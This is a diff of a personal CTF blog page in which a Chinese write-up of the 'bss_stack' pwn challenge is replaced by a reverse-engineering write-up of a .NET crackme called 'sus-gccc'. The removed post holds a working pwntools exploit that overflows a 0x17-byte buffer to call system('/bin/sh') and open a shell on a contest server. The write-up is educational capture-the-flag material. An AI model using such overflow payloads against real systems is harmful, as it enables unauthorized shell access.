@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&amp;quot;Enter password: &amp;quot;);fflush(stdout);fgets(&amp;amp;s, 100, stdin);puts(&amp;quot;Authentification failed&amp;quot;);fflush(st">
+<meta name="description" content=".net程序，dnspy反编译一波： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// Token: 0x02000002 RID: 2public class GrayCC">
 <meta property="og:type" content="article">
-<meta property="og:title" content="十一欢乐赛-bss_stack">
-<meta property="og:url" content="http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/index.html">
+<meta property="og:title" content="sus-gccc">
+<meta property="og:url" content="http://yoursite.com/2018/10/25/sus-gccc/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&amp;quot;Enter password: &amp;quot;);fflush(stdout);fgets(&amp;amp;s, 100, stdin);puts(&amp;quot;Authentification failed&amp;quot;);fflush(st">
+<meta property="og:description" content=".net程序，dnspy反编译一波： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// Token: 0x02000002 RID: 2public class GrayCC">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-10-03T09:27:54.207Z">
+<meta property="og:updated_time" content="2018-10-26T15:10:08.132Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="十一欢乐赛-bss_stack">
-<meta name="twitter:description" content="找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&amp;quot;Enter password: &amp;quot;);fflush(stdout);fgets(&amp;amp;s, 100, stdin);puts(&amp;quot;Authentification failed&amp;quot;);fflush(st">
+<meta name="twitter:title" content="sus-gccc">
+<meta name="twitter:description" content=".net程序，dnspy反编译一波： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// Token: 0x02000002 RID: 2public class GrayCC">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>十一欢乐赛-bss_stack | 4eriri&#39;s blog</title>
+<title>sus-gccc | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -189,11 +189,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-十一欢乐赛-bss-stack" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-sus-gccc" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/10/03/十一欢乐赛-bss-stack/" class="article-date">
-      <time datetime="2018-10-03T08:24:15.000Z" itemprop="datePublished">2018-10-03</time>
+      <a href="/2018/10/25/sus-gccc/" class="article-date">
+      <time datetime="2018-10-25T13:51:39.000Z" itemprop="datePublished">2018-10-25</time>
 </a>
 
 
@@ -208,7 +208,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      十一欢乐赛-bss_stack
+      sus-gccc
     </h1>
   
 
@@ -225,13 +225,9 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>找了半天才找到在哪有栈溢出QAQ</p>
-<p>是在输入完用户名再输入1之后，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+11h] [ebp-17h]</span><br><span class="line"></span><br><span class="line">printf(&quot;Enter password: &quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">fgets(&amp;s, 100, stdin);</span><br><span class="line">puts(&quot;Authentification failed&quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">return sleep(1u);</span><br></pre></td></tr></table></figure>
-<p>fgets可以读入100个字符，s大小为0x17,所以输入超过0x17+4的话就可以覆盖返回地址。</p>
-<p>这题是有system函数调用的，只是没有/bin/sh字符串，所以只需要找到system地址，再在username地址写入/bin/sh就行了，另外call system的时候会push一个返回地址，再往后才是参数command，因此要留出4个字节的offset脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10011)</span><br><span class="line">sh.recvuntil(&apos;User name : &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Action: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Enter password: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048500)+&apos;a&apos;*4+p32(0x08049dc8)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>之后cat flag就可以得到flag了</p>
+        <p>.net程序，dnspy反编译一波：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">// Token: 0x02000002 RID: 2</span><br><span class="line">public class GrayCCC</span><br><span class="line">&#123;</span><br><span class="line">	// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000458</span><br><span class="line">	public static void Main()</span><br><span class="line">	&#123;</span><br><span class="line">		Console.Write(&quot;Input the key: &quot;);</span><br><span class="line">		uint num;</span><br><span class="line">		if (!uint.TryParse(Console.ReadLine().Trim(), out num))</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		string text = &quot;&quot;;</span><br><span class="line">		string text2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125; &quot;;</span><br><span class="line">		int num2 = 0;</span><br><span class="line">		byte[] array = new byte[]</span><br><span class="line">		&#123;</span><br><span class="line">			164,</span><br><span class="line">			25,</span><br><span class="line">			4,</span><br><span class="line">			130,</span><br><span class="line">			126,</span><br><span class="line">			158,</span><br><span class="line">			91,</span><br><span class="line">			199,</span><br><span class="line">			173,</span><br><span class="line">			252,</span><br><span class="line">			239,</span><br><span class="line">			143,</span><br><span class="line">			150,</span><br><span class="line">			251,</span><br><span class="line">			126,</span><br><span class="line">			39,</span><br><span class="line">			104,</span><br><span class="line">			104,</span><br><span class="line">			146,</span><br><span class="line">			208,</span><br><span class="line">			249,</span><br><span class="line">			9,</span><br><span class="line">			219,</span><br><span class="line">			208,</span><br><span class="line">			101,</span><br><span class="line">			182,</span><br><span class="line">			62,</span><br><span class="line">			92,</span><br><span class="line">			6,</span><br><span class="line">			27,</span><br><span class="line">			5,</span><br><span class="line">			46</span><br><span class="line">		&#125;;</span><br><span class="line">		byte b = 0;</span><br><span class="line">		while (num != 0u)</span><br><span class="line">		&#123;</span><br><span class="line">			char c = (char)(array[num2] ^ (byte)num ^ b);</span><br><span class="line">			if (!text2.Contains(new string(c, 1)))</span><br><span class="line">			&#123;</span><br><span class="line">				Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			text += c;</span><br><span class="line">			b ^= array[num2++];</span><br><span class="line">			num &gt;&gt;= 1;</span><br><span class="line">		&#125;</span><br><span class="line">		if (text.Substring(0, 5) != &quot;FLAG&#123;&quot; || text.Substring(31, 1) != &quot;&#125;&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		Console.WriteLine(&quot;Your flag is: &quot; + text);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>定义了uint类型变量num，<code>text[i]=array[i]^(num&amp;0xff)^b</code>，不过b=0可以忽略不计，最后要求text的前五位为FLAG{，最后一位为}，并且每一位都是大写字母，题目推荐使用z3求解。</p>
 
       
     </div>
@@ -240,13 +236,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/10/03/十一欢乐赛-bss-stack/">十一欢乐赛-bss_stack</a></p>
+        <p><span>本文标题:</span><a href="/2018/10/25/sus-gccc/">sus-gccc</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-10-03, 16:24:15</p>
-        <p><span>最后更新:</span>2018-10-03, 17:27:54</p>
+        <p><span>发布时间:</span>2018-10-25, 21:51:39</p>
+        <p><span>最后更新:</span>2018-10-26, 23:10:08</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/10/03/十一欢乐赛-bss-stack/" title="十一欢乐赛-bss_stack">http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/10/25/sus-gccc/" title="sus-gccc">http://yoursite.com/2018/10/25/sus-gccc/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/25/sus-gccc/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -259,15 +255,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/10/03/十一欢乐赛-pwn4/">
-                    十一欢乐赛-pwn4
+                <a href="/2018/10/26/杭电ctf/">
+                    杭电ctf
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/10/02/cgctf-born/">
-                    cgctf-born
+                <a href="/2018/10/24/实验吧-3/">
+                    实验吧-3
                 </a>
             </div>
         
@@ -315,7 +311,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"十一欢乐赛-bss_stack　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"sus-gccc　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -335,7 +331,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/10/03/十一欢乐赛-pwn4/" title="上一篇: 十一欢乐赛-pwn4">
+            <a href="/2018/10/26/杭电ctf/" title="上一篇: 杭电ctf">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -343,7 +339,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/10/02/cgctf-born/" title="下一篇: cgctf-born">
+            <a href="/2018/10/24/实验吧-3/" title="下一篇: 实验吧-3">
                 <i class="fa fa-angle-right"></i>
             </a>
         
